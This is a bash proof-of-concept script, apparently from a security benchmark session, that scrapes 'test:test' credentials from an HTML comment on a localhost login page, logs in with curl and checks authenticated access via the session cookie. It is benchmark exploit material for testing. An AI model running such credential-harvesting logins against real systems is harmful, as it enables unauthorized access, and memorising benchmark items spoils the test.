#!/bin/bash
# POC: Demonstrates extraction of hardcoded test credentials from HTML comments and successful authentication bypass
# Target: ./repo
# Created: 2025-10-31T14:43:42.515Z
# Session: benchmark-XBEN-022-24-mhey9d7a

echo "=========================================="
echo "POC: Exposed Test Credentials in HTML Comments"
echo "=========================================="
echo ""

TARGET="http://localhost:8080"

echo "[*] Step 1: Fetching login page and extracting credentials from HTML comments..."
echo ""

# Fetch the login page and look for TODO comments with credentials
CREDENTIALS=$(curl -s "${TARGET}/login" | grep -oP '(?<=TODO:)[^-]*(?=-->)' | grep -oP 'test:test')

if [ -z "$CREDENTIALS" ]; then
    echo "[-] Could not find credentials in HTML comments"
    echo "[*] Attempting alternative extraction method..."
    
    # Try to find the full comment
    FULL_COMMENT=$(curl -s "${TARGET}/login" | grep -i "TODO.*test.*test")
    
    if [ -z "$FULL_COMMENT" ]; then
        echo "[-] No TODO comment found in page source"
        exit 1
    else
        echo "[+] Found comment: $FULL_COMMENT"
        CREDENTIALS="test:test"
    fi
else
    echo "[+] Extracted credentials from HTML comment: $CREDENTIALS"
fi

echo ""
echo "[*] Step 2: Attempting authentication with exposed credentials..."
echo "    Username: test"
echo "    Password: test"
echo ""

# Attempt login with the exposed credentials
RESPONSE=$(curl -i -s -X POST "${TARGET}/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=test&password=test" \
    -c /tmp/session_cookies.txt)

echo "$RESPONSE"
echo ""

# Check for successful authentication indicators
if echo "$RESPONSE" | grep -q "HTTP/.*302"; then
    echo "[+] SUCCESS: Authentication successful with exposed credentials!"
    echo "[+] Received HTTP 302 redirect"
    
    # Extract session cookie if present
    SESSION_COOKIE=$(echo "$RESPONSE" | grep -i "Set-Cookie:" | grep "session=" | cut -d' ' -f2)
    
    if [ ! -z "$SESSION_COOKIE" ]; then
        echo "[+] Session cookie obtained: $SESSION_COOKIE"
    fi
    
    echo ""
    echo "[*] Step 3: Verifying authenticated access..."
    
    # Try to access the home page with the session cookie
    HOME_RESPONSE=$(curl -s -b /tmp/session_cookies.txt "${TARGET}/home")
    
    if echo "$HOME_RESPONSE" | grep -qi "loan\|profile\|dashboard\|welcome"; then
        echo "[+] Successfully accessed authenticated page (/home)"
        echo "[+] VULNERABILITY CONFIRMED: Test credentials from HTML comments provide full access"
    else
        echo "[!] Authenticated but home page content unclear"
    fi
    
elif echo "$RESPONSE" | grep -q "HTTP/.*200"; then
    # Check if it's a failed login (200 with error message)
    if echo "$RESPONSE" | grep -qi "invalid\|error\|failed"; then
        echo "[-] Authentication failed - credentials may have been changed"
        exit 1
    else
        echo "[!] Received HTTP 200 - login may have succeeded without redirect"
    fi
else
    echo "[-] Authentication attempt did not return expected response"
    exit 1
fi

echo ""
echo "=========================================="
echo "POC COMPLETE"
echo "=========================================="
echo ""
echo "IMPACT: Anyone can view the login page source, extract the"
echo "test:test credentials, and gain unauthorized access to the application."

# Cleanup
rm -f /tmp/session_cookies.txt

exit 0